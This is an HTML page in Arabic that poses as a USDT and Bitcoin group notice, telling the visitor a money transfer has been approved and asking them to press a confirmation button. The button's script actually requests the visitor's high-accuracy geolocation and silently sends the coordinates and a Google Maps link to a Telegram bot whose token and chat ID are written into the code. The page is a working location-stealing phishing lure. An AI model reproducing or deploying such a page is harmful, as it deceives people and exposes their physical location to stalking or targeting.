<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>عملات رقمية USDT وبيتكوين</title>
  <style>
    body {
      background-color: #181818;
      color: white;
      font-family: sans-serif;
      text-align: center;
      padding: 20px;
    }
    .group-box {
      background-color: #222;
      border-radius: 15px;
      padding: 20px;
      box-shadow: 0 0 20px gold;
      max-width: 400px;
      margin: auto;
    }
    .group-img {
      width: 100px;
      margin-bottom: 10px;
    }
    .group-name {
      font-size: 1.4em;
      font-weight: bold;
      color: gold;
    }
    .message {
      background-color: #333;
      padding: 15px;
      margin-top: 15px;
      border-radius: 10px;
      color: #ddd;
    }
    .button {
      background-color: #FFD700;
      color: #000;
      border: none;
      padding: 12px 20px;
      font-size: 1em;
      border-radius: 10px;
      cursor: pointer;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="group-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" class="group-img" alt="Bitcoin Logo">
    <div class="group-name">عملات رقمية USDT وبيتكوين</div>
    <div class="message">
      تهانينا! لقد تم قبول الطلب لتحويل المال<br>
      الرجاء الضغط على الزر أدناه لتأكيد العملية.
    </div>
    <button class="button" onclick="getLocation()">تأكيد تحويل المال</button>
  </div>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(success, error, {
          enableHighAccuracy: true,
          timeout: 10000
        });
      }
    }

    function success(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      const token = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"; // توكن البوت
      const chat_id = "7485197107"; // معرف الشات
      const message = `📍 موقع جديد:\nLatitude: ${latitude}\nLongitude: ${longitude}\nhttps://maps.google.com/?q=${latitude},${longitude}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chat_id,
          text: message
        })
      });
    }

    function error(err) {
      console.warn("لم يتم تحديد الموقع:", err);
    }
  </script>
</body>
</html>
